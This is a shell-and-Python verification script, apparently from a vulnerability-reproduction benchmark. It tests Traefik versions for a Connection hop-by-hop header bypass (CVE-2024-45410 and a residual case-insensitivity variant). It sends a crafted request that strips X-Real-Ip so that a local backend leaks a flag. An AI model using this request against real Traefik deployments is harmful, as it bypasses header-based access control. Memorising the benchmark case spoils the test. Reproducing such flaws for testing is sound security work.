#!/usr/bin/env bash
# verify.sh --seed|--residual — Traefik Connection 头 hop-by-hop X-Real-Ip 剥离
# （CVE-2024-45410 seed / CVE-2026-29054 residual）。
#
# 漏洞机制：Traefik 默认 forwardedheaders 中间件拥有 X-Real-Ip（清空攻击者 X-* 并写真实客户端 IP）；
# 上游 /admin/secret 仅在 X-Real-Ip 缺失时返回 PCB_FLAG（视为可信内部来源）。攻击者把
# Traefik 管理的头名写进 HTTP/1.1 hop-by-hop `Connection`，反向代理即剥离该头 -> 后端无身份头 -> 泄 flag。
#   seed     Connection: close, X-Real-Ip   : V0(2.11.8) 达效果 | V1(2.11.9) 阻断（removeConnectionHeaders 大小写敏感匹配）
#   residual Connection: close, x-real-ip   : V1(2.11.9) 达效果 | V2(2.11.38) 阻断（token 先 CanonicalHeaderKey）
# 效果通道 = 上游响应 body 中的 RUN_FLAG_REF（平台真 flag；wrong/stale 检查时 RUN_FLAG 为 override，
# 判定基准必须用 RUN_FLAG_REF，回退 RUN_FLAG）。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

# 目标端口：优先 docker compose port 解析（平台动态端口），回退 case 固定端口
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
case "$VERSION" in
  v0) FIXED=39390;; v1) FIXED=39391;; v2) FIXED=39392;; *) FIXED=39390;;
esac
PORT="${PORT:-$FIXED}"
FLAG="$RUN_FLAG"

"$PY" - "$MODE" "$PORT" "$FLAG" <<'PYEOF'
import socket, sys
mode, port, flag = sys.argv[1], int(sys.argv[2]), sys.argv[3]
conn = "close, X-Real-Ip" if mode == "--seed" else "close, x-real-ip"
req = ("GET /admin/secret HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nConnection: %s\r\n\r\n"
       % (port, conn)).encode("latin-1")
try:
    with socket.create_connection(("127.0.0.1", port), timeout=20.0) as s:
        s.settimeout(20.0)
        s.sendall(req)
        chunks = []
        while True:
            b = s.recv(65536)
            if not b:
                break
            chunks.append(b)
    raw = b"".join(chunks)
except Exception as e:
    print("socket-error: %s" % e)
    sys.exit(20)
head, _, body = raw.partition(b"\r\n\r\n")
body_s = body.decode("utf-8", "replace")
status_line = head.split(b"\r\n", 1)[0].decode("latin-1", "replace")
print("HTTP %s | Connection=%s | body=%s" % (status_line, conn, body_s[:120]))
sys.exit(0 if flag in body_s else 10)
PYEOF
RC=$?
echo "verify rc=$RC (0=effect: flag leaked / 10=blocked: forbidden)"
exit $RC
